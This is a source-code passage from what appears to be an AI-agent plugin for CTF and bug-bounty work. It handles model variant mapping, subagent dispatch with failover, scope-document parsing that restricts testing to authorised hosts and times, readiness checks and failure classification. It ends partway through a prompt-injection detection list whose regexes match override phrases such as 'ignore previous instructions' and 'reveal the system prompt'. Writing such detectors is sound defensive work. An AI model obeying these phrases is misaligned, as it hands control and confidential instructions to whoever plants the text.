    if (normalized === "max")
      return "xhigh";
    if (normalized === "minimal")
      return "low";
    if (normalized === "none")
      return "low";
    return normalized;
  }
  if (provider === "google") {
    if (normalized === "xhigh")
      return "high";
    if (normalized === "max")
      return "high";
    if (normalized === "none")
      return "low";
    return normalized;
  }
  if (provider === "anthropic") {
    if (normalized === "high" || normalized === "xhigh" || normalized === "medium")
      return "max";
    if (normalized === "minimal" || normalized === "none")
      return "low";
    return normalized;
  }
  return normalized;
}
function supportedVariantsForModel(model) {
  return MODEL_VARIANTS[model] ?? [];
}
function defaultVariantForModel(model) {
  if (MODELS_WITHOUT_VARIANT.has(model) || providerIdFromModel(model) === "google") {
    return "";
  }
  return MODEL_DEFAULT_VARIANT[model] ?? DEFAULT_AGENT_VARIANT;
}
function isVariantSupportedForModel(model, variant) {
  if (MODELS_WITHOUT_VARIANT.has(model) || providerIdFromModel(model) === "google") {
    return variant.trim().length === 0;
  }
  const allowed = supportedVariantsForModel(model);
  if (allowed.length === 0) {
    return true;
  }
  return allowed.includes(variant.trim());
}
function normalizeVariantForModel(model, requestedVariant, fallbackVariant = "") {
  if (MODELS_WITHOUT_VARIANT.has(model)) {
    return "";
  }
  const provider = providerIdFromModel(model);
  const allowed = supportedVariantsForModel(model);
  const requested = requestedVariant.trim();
  const fallback = fallbackVariant.trim();
  if (provider === "google" && allowed.length === 0) {
    return "";
  }
  if (allowed.length === 0) {
    if (requested)
      return requested;
    if (fallback)
      return fallback;
    return defaultVariantForModel(model);
  }
  if (requested && allowed.includes(requested)) {
    return requested;
  }
  const mappedRequested = requested ? mapVariantAlias(model, requested) : null;
  if (mappedRequested && allowed.includes(mappedRequested)) {
    return mappedRequested;
  }
  if (fallback && allowed.includes(fallback)) {
    return fallback;
  }
  const mappedFallback = fallback ? mapVariantAlias(model, fallback) : null;
  if (mappedFallback && allowed.includes(mappedFallback)) {
    return mappedFallback;
  }
  return defaultVariantForModel(model);
}
function resolveAgentExecutionProfile(agentName, options) {
  const baseAgent = baseAgentName(agentName);
  const baseProfile = AGENT_OVERRIDES[baseAgent] ?? {
    model: DEFAULT_AGENT_MODEL,
    variant: DEFAULT_AGENT_VARIANT
  };
  const suffixIndex = agentName.indexOf(VARIANT_SEP);
  const legacyModel = suffixIndex !== -1 ? SHORT_TO_MODEL[agentName.slice(suffixIndex + VARIANT_SEP.length)] : undefined;
  const seedModel = legacyModel ?? baseProfile.model;
  const model = options?.preferredModel && options.preferredModel.trim().length > 0 ? options.preferredModel.trim() : seedModel;
  const variant = normalizeVariantForModel(model, options?.preferredVariant ?? "", baseProfile.variant);
  return {
    baseAgent,
    model,
    variant
  };
}

// src/orchestration/task-dispatch.ts
var NON_OVERRIDABLE_ROUTE_AGENTS = new Set([
  "ctf-verify",
  "ctf-decoy-check",
  "bounty-scope",
  "md-scribe"
]);
function isNonOverridableSubagent(name) {
  if (!name) {
    return false;
  }
  return NON_OVERRIDABLE_ROUTE_AGENTS.has(baseAgentName(name));
}
var ROUTE_AGENT_MAP = {
  "aegis-plan": "aegis-plan",
  "aegis-exec": "aegis-exec",
  "aegis-deep": "aegis-deep",
  "bounty-scope": "bounty-scope",
  "ctf-web": "ctf-web",
  "ctf-web3": "ctf-web3",
  "ctf-pwn": "ctf-pwn",
  "ctf-rev": "ctf-rev",
  "ctf-crypto": "ctf-crypto",
  "ctf-forensics": "ctf-forensics",
  "ctf-explore": "ctf-explore",
  "ctf-solve": "ctf-solve",
  "ctf-research": "ctf-research",
  "ctf-hypothesis": "ctf-hypothesis",
  "ctf-decoy-check": "ctf-decoy-check",
  "ctf-verify": "ctf-verify",
  "bounty-triage": "bounty-triage",
  "bounty-research": "bounty-research",
  "deep-plan": "deep-plan",
  "md-scribe": "md-scribe",
  "aegis-explore": "aegis-explore",
  "aegis-librarian": "aegis-librarian"
};
function currentRouting(config2) {
  return config2?.routing ?? DEFAULT_ROUTING;
}
function requiredDispatchSubagents(config2) {
  const routing = currentRouting(config2);
  const required2 = new Set(Object.values(ROUTE_AGENT_MAP));
  for (const domain2 of [routing.ctf, routing.bounty]) {
    for (const phase of [domain2.scan, domain2.plan, domain2.execute, domain2.stuck, domain2.failover]) {
      for (const routeName of Object.values(phase)) {
        required2.add(ROUTE_AGENT_MAP[routeName] ?? routeName);
      }
    }
  }
  return [...required2];
}
function fallbackFor(mode, targetType, config2) {
  const routing = currentRouting(config2);
  if (mode === "CTF") {
    return routing.ctf.failover[targetType];
  }
  return routing.bounty.failover[targetType];
}
function dispatchScore(state, subagentType) {
  const health = state.dispatchHealthBySubagent[subagentType];
  if (!health) {
    return 0;
  }
  return health.successCount * 2 - health.retryableFailureCount - health.hardFailureCount * 2 - health.consecutiveFailureCount * 3;
}
function capabilityCandidates(state, config2) {
  if (!config2) {
    return [];
  }
  const profile = state.mode === "CTF" ? config2.capability_profiles.ctf[state.targetType] : config2.capability_profiles.bounty[state.targetType];
  return profile.required_subagents;
}
function chooseOperationalSubagent(routePrimary, state, mappedSubagent, config2) {
  const threshold = config2?.auto_dispatch.operational_feedback_consecutive_failures ?? 2;
  const mappedHealth = state.dispatchHealthBySubagent[mappedSubagent];
  if (!mappedHealth || mappedHealth.consecutiveFailureCount < threshold) {
    return {
      subagent_type: mappedSubagent,
      reason: `route '${routePrimary}' mapped to subagent '${mappedSubagent}'`
    };
  }
  const pool = [];
  const pushUnique = (value) => {
    if (value && !pool.includes(value)) {
      pool.push(value);
    }
  };
  pushUnique(mappedSubagent);
  pushUnique(fallbackFor(state.mode, state.targetType, config2));
  for (const candidate of capabilityCandidates(state, config2)) {
    pushUnique(candidate);
  }
  let best = mappedSubagent;
  let bestScore = dispatchScore(state, mappedSubagent);
  for (const candidate of pool) {
    if (candidate === mappedSubagent) {
      continue;
    }
    const score = dispatchScore(state, candidate);
    if (score > bestScore) {
      best = candidate;
      bestScore = score;
    }
  }
  if (best === mappedSubagent) {
    return {
      subagent_type: mappedSubagent,
      reason: `mapped subagent '${mappedSubagent}' retained despite failure streak (${mappedHealth.consecutiveFailureCount}).`
    };
  }
  return {
    subagent_type: best,
    reason: `operational feedback switched '${mappedSubagent}' -> '${best}' after ${mappedHealth.consecutiveFailureCount} consecutive failures`
  };
}
function decideAutoDispatch(routePrimary, state, maxFailoverRetries, config2) {
  const dynamicModelEnabled = Boolean(config2?.dynamic_model?.enabled && config2?.dynamic_model?.generate_variants);
  const modelCooldownMs = config2?.dynamic_model?.health_cooldown_ms ?? 300000;
  const maybeApplyModelFailover = (decision) => {
    if (!dynamicModelEnabled || !decision.subagent_type) {
      return decision;
    }
    if (isNonOverridableSubagent(decision.subagent_type)) {
      return decision;
    }
    const primaryModel = agentModel(decision.subagent_type);
    if (!primaryModel) {
      return decision;
    }
    const resolvedModel = resolveHealthyModel(decision.subagent_type, state, modelCooldownMs);
    if (!resolvedModel || resolvedModel === primaryModel) {
      return decision;
    }
    return {
      ...decision,
      model: resolvedModel,
      reason: `${decision.reason}; model-failover '${primaryModel}' -> '${resolvedModel}'`
    };
  };
  if (state.pendingTaskFailover && state.taskFailoverCount < maxFailoverRetries) {
    const fallback = fallbackFor(state.mode, state.targetType, config2);
    return maybeApplyModelFailover({
      subagent_type: fallback,
      reason: `pending failover retry (${state.taskFailoverCount + 1}/${maxFailoverRetries}) after tool failure`
    });
  }
  const mapped = ROUTE_AGENT_MAP[routePrimary] ?? routePrimary;
  if (!mapped) {
    return {
      reason: "no route-agent mapping found"
    };
  }
  if (isNonOverridableSubagent(mapped)) {
    return {
      subagent_type: mapped,
      reason: `route '${routePrimary}' is non-overridable and pinned to '${mapped}'`
    };
  }
  const baseDecision = !config2?.auto_dispatch.operational_feedback_enabled ? { subagent_type: mapped, reason: `route '${routePrimary}' mapped to subagent '${mapped}'` } : chooseOperationalSubagent(routePrimary, state, mapped, config2);
  return maybeApplyModelFailover(baseDecision);
}

// src/bounty/scope-policy.ts
import { existsSync as existsSync2, readFileSync as readFileSync2, statSync } from "fs";
import { join as join2 } from "path";
var DEFAULT_CANDIDATES = [
  ".Aegis/scope.md",
  ".opencode/bounty-scope.md",
  "BOUNTY_SCOPE.md",
  "SCOPE.md"
];
function normalizeHost(host) {
  return host.trim().toLowerCase().replace(/\.+$/, "");
}
function parseHostToken(token) {
  const raw = token.trim();
  if (!raw)
    return null;
  const withoutPunct = raw.replace(/^[`'"\[\(\{<]+|[`'"\]\)\}>.,;:]+$/g, "");
  if (!withoutPunct)
    return null;
  if (/^https?:\/\//i.test(withoutPunct)) {
    try {
      const u = new URL(withoutPunct);
      const h = normalizeHost(u.hostname);
      if (!h)
        return null;
      return { kind: "exact", host: h };
    } catch {
      return null;
    }
  }
  const wildcard = withoutPunct.match(/^\*\.(.+)$/);
  if (wildcard) {
    const suffix = normalizeHost(wildcard[1]);
    if (!suffix)
      return null;
    return { kind: "suffix", suffix };
  }
  const hostLike = withoutPunct.match(/^[a-z0-9-]+(\.[a-z0-9-]+)+$/i);
  if (!hostLike)
    return null;
  const host = normalizeHost(withoutPunct);
  return host ? { kind: "exact", host } : null;
}
function parseDayToIndex(text) {
  const t = text.trim();
  if (t.includes("\uC77C"))
    return 0;
  if (t.includes("\uC6D4"))
    return 1;
  if (t.includes("\uD654"))
    return 2;
  if (t.includes("\uC218"))
    return 3;
  if (t.includes("\uBAA9"))
    return 4;
  if (t.includes("\uAE08"))
    return 5;
  if (t.includes("\uD1A0"))
    return 6;
  if (/\bsun(day)?\b/i.test(t))
    return 0;
  if (/\bmon(day)?\b/i.test(t))
    return 1;
  if (/\btue(s|sday)?\b/i.test(t))
    return 2;
  if (/\bwed(nesday)?\b/i.test(t))
    return 3;
  if (/\bthu(r|rs|rsday)?\b/i.test(t))
    return 4;
  if (/\bfri(day)?\b/i.test(t))
    return 5;
  if (/\bsat(urday)?\b/i.test(t))
    return 6;
  return null;
}
function parseTimeToMinutes(hhmm) {
  const m = hhmm.trim().match(/^(\d{1,2}):(\d{2})$/);
  if (!m)
    return null;
  const hh = Number(m[1]);
  const mm = Number(m[2]);
  if (!Number.isFinite(hh) || !Number.isFinite(mm))
    return null;
  if (hh < 0 || hh > 23 || mm < 0 || mm > 59)
    return null;
  return hh * 60 + mm;
}
function parseBlackoutWindows(lines) {
  const windows = [];
  const warnings = [];
  const re = /(\uC6D4|\uD654|\uC218|\uBAA9|\uAE08|\uD1A0|\uC77C|mon(?:day)?|tue(?:s|sday)?|wed(?:nesday)?|thu(?:r|rs|rsday)?|fri(?:day)?|sat(?:urday)?|sun(?:day)?)\s*\uC694\uC77C?\s*(\d{1,2}:\d{2})\s*[~\-]\s*(\d{1,2}:\d{2})/gi;
  for (const line of lines) {
    const matches = [...line.matchAll(re)];
    for (const match of matches) {
      const day = parseDayToIndex(match[1] ?? "");
      const start = parseTimeToMinutes(match[2] ?? "");
      const end = parseTimeToMinutes(match[3] ?? "");
      if (day === null || start === null || end === null) {
        warnings.push(`failed_to_parse_blackout: ${line.trim()}`);
        continue;
      }
      if (end >= start) {
        windows.push({ day, startMinutes: start, endMinutes: end });
        continue;
      }
      windows.push({ day, startMinutes: start, endMinutes: 1439 });
      windows.push({ day: (day + 1) % 7, startMinutes: 0, endMinutes: end });
    }
  }
  return { windows, warnings };
}
function classifySection(line) {
  if (/(\uBC94\uC704\s*\uB0B4|\uD5C8\uC6A9|\uD14C\uC2A4\uD2B8\s*\uAC00\uB2A5|in\s*-?\s*scope|scope\s*in|eligible|authorized)/i.test(line)) {
    return "allow";
  }
  if (/(\uBC94\uC704\s*\uC678|\uBE44\uB300\uC0C1|\uC81C\uC678|\uAE08\uC9C0|out\s*-?\s*of\s*-?\s*scope|scope\s*out|exclude|excluded|prohibited|forbidden)/i.test(line)) {
    return "deny";
  }
  return "unknown";
}
function dedupeSorted(list) {
  const out = [...new Set(list.filter(Boolean))];
  out.sort();
  return out;
}
function parseScopeMarkdown(markdown, sourcePath, mtimeMs, options) {
  const includeApexForWildcardAllow = options?.includeApexForWildcardAllow === true;
  const warnings = [];
  const lines = markdown.split(/\r?\n/);
  const { windows, warnings: blackoutWarnings } = parseBlackoutWindows(lines);
  warnings.push(...blackoutWarnings);
  const allowedHostsExact = [];
  const allowedHostsSuffix = [];
  const deniedHostsExact = [];
  const deniedHostsSuffix = [];
  let mode = "unknown";
  for (const line of lines) {
    const section = classifySection(line);
    if (section !== "unknown") {
      mode = section;
    }
    const tokens = line.split(/[\s|`]+/).map((t) => t.trim()).filter(Boolean);
    for (const token of tokens) {
      const parsed = parseHostToken(token);
      if (!parsed)
        continue;
      if (mode === "unknown") {
        continue;
      }
      const target = mode;
      if (parsed.kind === "exact") {
        if (target === "deny")
          deniedHostsExact.push(parsed.host);
        else
          allowedHostsExact.push(parsed.host);
      } else {
        if (target === "deny")
          deniedHostsSuffix.push(parsed.suffix);
        else {
          allowedHostsSuffix.push(parsed.suffix);
          if (includeApexForWildcardAllow) {
            allowedHostsExact.push(parsed.suffix);
          }
        }
      }
    }
  }
  for (const line of lines) {
    const m = line.match(/\uAE30\uC900\s*\uB3C4\uBA54\uC778\s*:\s*([a-z0-9.-]+)\b/i);
    if (m) {
      const h = normalizeHost(m[1] ?? "");
      if (h) {
        allowedHostsExact.push(h);
      }
    }
  }
  return {
    sourcePath,
    sourceMtimeMs: mtimeMs,
    allowedHostsExact: dedupeSorted(allowedHostsExact),
    allowedHostsSuffix: dedupeSorted(allowedHostsSuffix),
    deniedHostsExact: dedupeSorted(deniedHostsExact),
    deniedHostsSuffix: dedupeSorted(deniedHostsSuffix),
    blackoutWindows: windows,
    warnings: dedupeSorted(warnings)
  };
}
function resolveScopeDocCandidates(projectDir, config2) {
  const candidates = config2?.candidates?.length ? config2.candidates : [...DEFAULT_CANDIDATES];
  return candidates.map((p) => join2(projectDir, p));
}
function loadScopePolicyFromWorkspace(projectDir, config2) {
  const warnings = [];
  const candidates = resolveScopeDocCandidates(projectDir, config2);
  let path = null;
  for (const candidate of candidates) {
    if (existsSync2(candidate)) {
      path = candidate;
      break;
    }
  }
  if (!path) {
    return {
      ok: false,
      reason: `No scope document found. Looked for: ${candidates.map((c) => c.replace(projectDir + "/", "")).join(", ")}`,
      warnings
    };
  }
  let raw;
  let mtimeMs = 0;
  try {
    raw = readFileSync2(path, "utf-8");
    mtimeMs = statSync(path).mtimeMs;
  } catch (error48) {
    const message = error48 instanceof Error ? error48.message : String(error48);
    return { ok: false, reason: `Failed to read scope document '${path}': ${message}`, warnings };
  }
  const policy = parseScopeMarkdown(raw, path, mtimeMs, {
    includeApexForWildcardAllow: config2?.includeApexForWildcardAllow === true
  });
  return { ok: true, policy };
}
function hostMatchesPolicy(host, policy) {
  const normalized = normalizeHost(host);
  if (!normalized) {
    return { allowed: false, reason: "empty_host" };
  }
  const deniedExact = new Set(policy.deniedHostsExact);
  const deniedSuffix = policy.deniedHostsSuffix;
  if (deniedExact.has(normalized)) {
    return { allowed: false, reason: `host_denied_exact:${normalized}` };
  }
  for (const suffix of deniedSuffix) {
    if (normalized === suffix || normalized.endsWith(`.${suffix}`)) {
      return { allowed: false, reason: `host_denied_suffix:${suffix}` };
    }
  }
  const allowedExact = new Set(policy.allowedHostsExact);
  const allowedSuffix = policy.allowedHostsSuffix;
  if (allowedExact.has(normalized)) {
    return { allowed: true };
  }
  for (const suffix of allowedSuffix) {
    if (normalized.endsWith(`.${suffix}`)) {
      return { allowed: true };
    }
  }
  return { allowed: false, reason: "host_not_in_allowlist" };
}
function isInBlackout(now, windows) {
  const day = now.getDay();
  const minutes = now.getHours() * 60 + now.getMinutes();
  for (const w of windows) {
    if (w.day !== day)
      continue;
    if (w.startMinutes <= minutes && minutes <= w.endMinutes)
      return true;
  }
  return false;
}

// src/state/types.ts
var TARGET_TYPES = [
  "WEB_API",
  "WEB3",
  "PWN",
  "REV",
  "CRYPTO",
  "FORENSICS",
  "MISC",
  "UNKNOWN"
];
var DEFAULT_STATE = {
  mode: "BOUNTY",
  modeExplicit: false,
  ultraworkEnabled: false,
  thinkMode: "none",
  autoLoopEnabled: false,
  autoLoopIterations: 0,
  autoLoopStartedAt: 0,
  autoLoopLastPromptAt: 0,
  phase: "SCAN",
  targetType: "UNKNOWN",
  scopeConfirmed: false,
  candidatePendingVerification: false,
  latestCandidate: "",
  latestVerified: "",
  hypothesis: "",
  alternatives: [],
  noNewEvidenceLoops: 0,
  samePayloadLoops: 0,
  staleToolPatternLoops: 0,
  lastToolPattern: "",
  contradictionPivotDebt: 0,
  contradictionPatchDumpDone: false,
  mdScribePrimaryStreak: 0,
  verifyFailCount: 0,
  readonlyInconclusiveCount: 0,
  contextFailCount: 0,
  timeoutFailCount: 0,
  envParityChecked: false,
  envParityAllMatch: false,
  envParityRequired: false,
  envParityRequirementReason: "",
  envParitySummary: "",
  envParityUpdatedAt: 0,
  revVmSuspected: false,
  revRiskScore: 0,
  revRiskSignals: [],
  revStaticTrust: 1,
  recentEvents: [],
  lastTaskCategory: "",
  lastTaskRoute: "",
  lastTaskSubagent: "",
  lastTaskModel: "",
  lastTaskVariant: "",
  pendingTaskFailover: false,
  taskFailoverCount: 0,
  dispatchHealthBySubagent: {},
  subagentProfileOverrides: {},
  modelHealthByModel: {},
  lastFailureReason: "none",
  lastFailureSummary: "",
  lastFailedRoute: "",
  lastFailureAt: 0,
  failureReasonCounts: {
    none: 0,
    verification_mismatch: 0,
    tooling_timeout: 0,
    context_overflow: 0,
    hypothesis_stall: 0,
    unsat_claim: 0,
    static_dynamic_contradiction: 0,
    exploit_chain: 0,
    environment: 0
  },
  lastUpdatedAt: Date.now()
};

// src/mcp/context7.ts
var context7 = {
  type: "remote",
  url: "https://mcp.context7.com/mcp",
  enabled: true
};

// src/mcp/grep-app.ts
var grep_app = {
  type: "remote",
  url: "https://mcp.grep.app",
  enabled: true
};

// src/mcp/memory.ts
import { isAbsolute, join as join3, resolve } from "path";
function createMemoryMcp(params) {
  const storageDir = params.storageDir?.trim() ? params.storageDir.trim() : ".Aegis/memory";
  const absDir = isAbsolute(storageDir) ? storageDir : resolve(params.projectDir, storageDir);
  const filePath = join3(absDir, "memory.jsonl");
  return {
    type: "local",
    command: ["npx", "-y", "@modelcontextprotocol/server-memory"],
    environment: {
      MEMORY_FILE_PATH: filePath
    },
    enabled: true
  };
}

// src/mcp/sequential-thinking.ts
var sequential_thinking = {
  type: "local",
  command: ["npx", "-y", "@modelcontextprotocol/server-sequential-thinking"],
  enabled: true
};

// src/mcp/websearch.ts
var websearch = {
  type: "remote",
  url: "https://mcp.exa.ai/mcp",
  enabled: true
};

// src/mcp/index.ts
function createBuiltinMcps(params) {
  const disabledMcps = params.disabledMcps ?? [];
  const allBuiltinMcps = {
    context7,
    grep_app,
    websearch,
    memory: createMemoryMcp({ projectDir: params.projectDir, storageDir: params.memoryStorageDir }),
    sequential_thinking
  };
  const mcps = {};
  for (const [name, config2] of Object.entries(allBuiltinMcps)) {
    if (!disabledMcps.includes(name)) {
      mcps[name] = config2;
    }
  }
  return mcps;
}

// src/config/readiness.ts
var MODES = ["CTF", "BOUNTY"];
function isRecord2(value) {
  return Boolean(value) && typeof value === "object" && !Array.isArray(value);
}
function stripJsonComments2(raw) {
  let out = "";
  let inString = false;
  let escaped = false;
  let inLineComment = false;
  let inBlockComment = false;
  for (let i = 0;i < raw.length; i += 1) {
    const ch = raw[i];
    const next = i + 1 < raw.length ? raw[i + 1] : "";
    if (inLineComment) {
      if (ch === `
`) {
        inLineComment = false;
        out += ch;
      }
      continue;
    }
    if (inBlockComment) {
      if (ch === "*" && next === "/") {
        inBlockComment = false;
        i += 1;
      }
      continue;
    }
    if (inString) {
      out += ch;
      if (escaped) {
        escaped = false;
        continue;
      }
      if (ch === "\\") {
        escaped = true;
        continue;
      }
      if (ch === '"') {
        inString = false;
      }
      continue;
    }
    if (ch === '"') {
      inString = true;
      out += ch;
      continue;
    }
    if (ch === "/" && next === "/") {
      inLineComment = true;
      i += 1;
      continue;
    }
    if (ch === "/" && next === "*") {
      inBlockComment = true;
      i += 1;
      continue;
    }
    out += ch;
  }
  return out;
}
function resolveOpencodeConfigPath(projectDir) {
  const home = process.env.HOME ?? "";
  const xdg = process.env.XDG_CONFIG_HOME ?? "";
  const appData = process.env.APPDATA ?? "";
  const baseCandidates = [
    join4(projectDir, ".opencode", "opencode"),
    join4(projectDir, "opencode"),
    xdg ? join4(xdg, "opencode", "opencode") : "",
    join4(home, ".config", "opencode", "opencode"),
    appData ? join4(appData, "opencode", "opencode") : ""
  ];
  const candidates = [
    ...baseCandidates.map((base) => base ? `${base}.jsonc` : ""),
    ...baseCandidates.map((base) => base ? `${base}.json` : "")
  ];
  for (const candidate of candidates) {
    if (candidate && existsSync3(candidate)) {
      return candidate;
    }
  }
  return null;
}
function parseOpencodeConfig(path) {
  try {
    const raw = readFileSync3(path, "utf-8");
    const parsed = JSON.parse(stripJsonComments2(raw));
    if (!isRecord2(parsed)) {
      return { data: null, warning: `OpenCode config is not an object: ${path}` };
    }
    return { data: parsed };
  } catch (error48) {
    const message = error48 instanceof Error ? error48.message : String(error48);
    return {
      data: null,
      warning: `Failed to parse OpenCode config '${path}': ${message}`
    };
  }
}
function extractAgentMap(config2) {
  const out = {};
  const candidates = [config2.agent, config2.agents];
  for (const candidate of candidates) {
    if (!isRecord2(candidate)) {
      continue;
    }
    for (const [key, value] of Object.entries(candidate)) {
      if (isRecord2(value)) {
        out[key] = value;
      }
    }
  }
  return out;
}
function requiredSubagentsForTarget(config2, mode, targetType) {
  const routing = mode === "CTF" ? config2.routing.ctf : config2.routing.bounty;
  const profile = mode === "CTF" ? config2.capability_profiles.ctf[targetType] : config2.capability_profiles.bounty[targetType];
  return [
    ...new Set([
      routing.scan[targetType],
      routing.plan[targetType],
      routing.execute[targetType],
      routing.stuck[targetType],
      routing.failover[targetType],
      ...profile.required_subagents
    ])
  ];
}
function providerIdFromModel2(model) {
  const trimmed = model.trim();
  const idx = trimmed.indexOf("/");
  if (idx === -1)
    return trimmed;
  return trimmed.slice(0, idx);
}
function collectRequiredProviders(requiredSubagents) {
  const providers = new Set;
  for (const name of requiredSubagents) {
    const model = agentModel(name);
    if (!model)
      continue;
    const provider = providerIdFromModel2(model);
    if (!provider)
      continue;
    providers.add(provider);
  }
  return [...providers].sort();
}
function collectPluginEntries(config2) {
  const plugins = Array.isArray(config2.plugin) ? config2.plugin : [];
  return plugins.filter((value) => typeof value === "string");
}
function buildReadinessReport(projectDir, notesStore, config2) {
  const notesWritable = notesStore.checkWritable();
  const scopeDocResult = loadScopePolicyFromWorkspace(projectDir, {
    candidates: config2.bounty_policy.scope_doc_candidates,
    includeApexForWildcardAllow: config2.bounty_policy.include_apex_for_wildcard_allow
  });
  const scopeDoc = scopeDocResult.ok ? {
    found: true,
    path: scopeDocResult.policy.sourcePath,
    warnings: scopeDocResult.policy.warnings,
    allowedHostsCount: scopeDocResult.policy.allowedHostsExact.length + scopeDocResult.policy.allowedHostsSuffix.length,
    deniedHostsCount: scopeDocResult.policy.deniedHostsExact.length + scopeDocResult.policy.deniedHostsSuffix.length,
    blackoutWindowsCount: scopeDocResult.policy.blackoutWindows.length
  } : {
    found: false,
    path: null,
    warnings: [scopeDocResult.reason, ...scopeDocResult.warnings],
    allowedHostsCount: 0,
    deniedHostsCount: 0,
    blackoutWindowsCount: 0
  };
  const requiredSubagents = new Set(requiredDispatchSubagents(config2));
  requiredSubagents.add(config2.failover.map.explore);
  requiredSubagents.add(config2.failover.map.librarian);
  requiredSubagents.add(config2.failover.map.oracle);
  const coverageByTarget = {};
  const requiredMcps = config2.enable_builtin_mcps ? Object.keys(createBuiltinMcps({
    projectDir,
    disabledMcps: config2.disabled_mcps,
    memoryStorageDir: config2.memory.storage_dir
  })) : [];
  const warnings = [];
  const issues = [];
  if (!notesWritable.ok) {
    issues.push(...notesWritable.issues);
  }
  if (config2.bounty_policy.require_scope_doc && !scopeDoc.found) {
    issues.push(`Missing bounty scope document (required): ${scopeDoc.warnings.join("; ")}`);
  } else if (!scopeDoc.found) {
    warnings.push(`No bounty scope document detected: ${scopeDoc.warnings.join("; ")}`);
  }
  const configPath = resolveOpencodeConfigPath(projectDir);
  if (!configPath) {
    const message = "No OpenCode config file found; subagent/MCP mapping checks unavailable.";
    if (config2.strict_readiness) {
      issues.push(message);
    } else {
      warnings.push(message);
    }
    return {
      ok: issues.length === 0,
      notesWritable: notesWritable.ok,
      checkedConfigPath: null,
      scopeDoc,
      requiredSubagents: [...requiredSubagents],
      missingSubagents: [],
      requiredProviders: [],
      missingProviders: [],
      requiredMcps,
      missingMcps: [],
      missingAuthPlugins: [],
      coverageByTarget,
      issues,
      warnings
    };
  }
  const parsed = parseOpencodeConfig(configPath);
  if (!parsed.data) {
    if (parsed.warning) {
      if (config2.strict_readiness) {
        issues.push(parsed.warning);
      } else {
        warnings.push(parsed.warning);
      }
    }
    return {
      ok: issues.length === 0,
      notesWritable: notesWritable.ok,
      checkedConfigPath: configPath,
      scopeDoc,
      requiredSubagents: [...requiredSubagents],
      missingSubagents: [],
      requiredProviders: [],
      missingProviders: [],
      requiredMcps,
      missingMcps: [],
      missingAuthPlugins: [],
      coverageByTarget,
      issues,
      warnings
    };
  }
  const availableMap = extractAgentMap(parsed.data);
  const available = new Set(Object.keys(availableMap));
  const missingSubagents = [...requiredSubagents].filter((name) => !available.has(name));
  if (missingSubagents.length > 0) {
    issues.push(`Missing required subagent mappings: ${missingSubagents.join(", ")}`);
  }
  const mcpMap = isRecord2(parsed.data.mcp) ? parsed.data.mcp : {};
  const missingMcps = requiredMcps.filter((name) => !isRecord2(mcpMap[name]));
  if (missingMcps.length > 0) {
    issues.push(`Missing required MCP mappings: ${missingMcps.join(", ")}`);
  }
  const requiredProviders = collectRequiredProviders(requiredSubagents);
  const providerMap = isRecord2(parsed.data.provider) ? parsed.data.provider : {};
  const missingProviders = requiredProviders.filter((name) => {
    if (name === "opencode") {
      return false;
    }
    return !isRecord2(providerMap[name]);
  });
  if (missingProviders.length > 0) {
    warnings.push(`Missing required provider mappings: ${missingProviders.join(", ")}`);
  }
  const plugins = collectPluginEntries(parsed.data);
  const missingAuthPlugins = [];
  if (requiredProviders.includes("openai")) {
    const hasOpenAICodexAuthPlugin = plugins.some((entry) => entry === "opencode-openai-codex-auth" || entry.startsWith("opencode-openai-codex-auth@"));
    if (!hasOpenAICodexAuthPlugin) {
      missingAuthPlugins.push("opencode-openai-codex-auth");
      warnings.push("OpenAI provider is used but opencode-openai-codex-auth plugin is missing.");
    }
  }
  for (const mode of MODES) {
    for (const targetType of TARGET_TYPES) {
      const key = `${mode}:${targetType}`;
      const required2 = requiredSubagentsForTarget(config2, mode, targetType);
      const missing = required2.filter((name) => !available.has(name));
      coverageByTarget[key] = {
        requiredSubagents: required2,
        missingSubagents: missing
      };
      if (missing.length > 0) {
        issues.push(`[${key}] missing subagents: ${missing.join(", ")}`);
      }
    }
  }
  return {
    ok: issues.length === 0,
    notesWritable: notesWritable.ok,
    checkedConfigPath: configPath,
    scopeDoc,
    requiredSubagents: [...requiredSubagents],
    missingSubagents,
    requiredProviders,
    missingProviders,
    requiredMcps,
    missingMcps,
    missingAuthPlugins,
    coverageByTarget,
    issues,
    warnings
  };
}

// src/risk/sanitize.ts
function normalizeWhitespace(input) {
  return input.replace(/\s+/g, " ").trim();
}
function stripAnsi(input) {
  return input.replace(new RegExp(String.raw`\\x1B\\[[0-9;]*m`, "g"), "");
}
function sanitizeCommand(input) {
  return normalizeWhitespace(stripAnsi(input));
}
function isLikelyTimeout(output) {
  const text = output.toLowerCase();
  return text.includes("timed out") || text.includes("timeout") || text.includes("deadline exceeded");
}
function isContextLengthFailure(output) {
  const text = output.toLowerCase();
  return text.includes("context_length_exceeded") || text.includes("maximum context length") || text.includes("invalid_request_error") || text.includes("messageoutputlengtherror");
}
function isTokenOrQuotaFailure(output) {
  const text = output.toLowerCase();
  return text.includes("insufficient_quota") || text.includes("quota exceeded") || text.includes("out of credits") || text.includes("token limit") || text.includes("rate limit") || text.includes("rate_limit_exceeded") || text.includes("status 429") || text.includes("provider model not found") || text.includes("providermodelnotfounderror");
}
function isRetryableTaskFailure(output) {
  return isContextLengthFailure(output) || isLikelyTimeout(output) || isTokenOrQuotaFailure(output);
}
function classifyFailureReason(output) {
  const text = output.toLowerCase();
  if (/(?:\bunsat\b|unsatisfiable|unsatisfiable\s+constraints|constraints\s+unsat)/i.test(text)) {
    return "unsat_claim";
  }
  if (/(?:static\s*\/\s*dynamic|static\s+analysis|dynamic\s+analysis|runtime).*?(?:contradict|mismatch|inconsistent)|(?:contradict|mismatch|inconsistent).*?(?:static\s*\/\s*dynamic|static\s+analysis|dynamic\s+analysis|runtime)/i.test(text)) {
    return "static_dynamic_contradiction";
  }
  if (isContextLengthFailure(output)) {
    return "context_overflow";
  }
  if (isLikelyTimeout(output) || isTokenOrQuotaFailure(output)) {
    return "tooling_timeout";
  }
  if (isVerifyFailure(output)) {
    return "verification_mismatch";
  }
  if (/(segmentation fault|sigsegv|stack smashing|core dumped|double free|abort trap|assertion failed|fatal signal|crash)/i.test(text)) {
    return "exploit_chain";
  }
  if (/(permission denied|operation not permitted|no such file|command not found|failed to spawn|exec format error|connection refused)/i.test(text)) {
    return "environment";
  }
  if (/(no new evidence|no-new-evidence|same payload|same-payload|inconclusive|\bhypothesis\s+stall\b|\bstuck\b)/i.test(text)) {
    return "hypothesis_stall";
  }
  return null;
}
var INJECTION_PATTERNS = [
  { id: "ignore_instructions", pattern: /ignore\s+(all\s+)?(previous|prior|system|developer)\s+instructions/i },
  { id: "reveal_prompt", pattern: /(show|reveal|print|dump)\s+(the\s+)?(system|developer)\s+prompt/i },
